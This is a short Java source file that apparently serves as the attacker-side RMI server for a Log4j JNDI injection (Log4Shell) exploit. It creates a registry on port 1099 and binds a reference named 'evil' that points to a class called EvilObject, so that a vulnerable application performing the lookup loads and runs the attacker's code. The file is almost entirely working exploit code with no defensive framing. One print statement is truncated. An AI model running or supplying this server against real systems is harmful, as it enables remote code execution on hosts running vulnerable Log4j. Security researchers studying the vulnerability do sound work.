package log4j.security.hole.rmi;


import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();

        System.out.println("Create RMT registry on port 1099");
        final String factory = RMIServer.class.getName();

        Reference reference = new Reference("log4j.security.hole.rmi.EvilObject", "log4j.security.hole.rmi.EvilObject", factory);
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        System.out.println("binding 'refObjWrapper' to 'rmi:");
//
//        //给资源命名， 并绑定
        registry.bind("evil", referenceWrapper);
    }

}
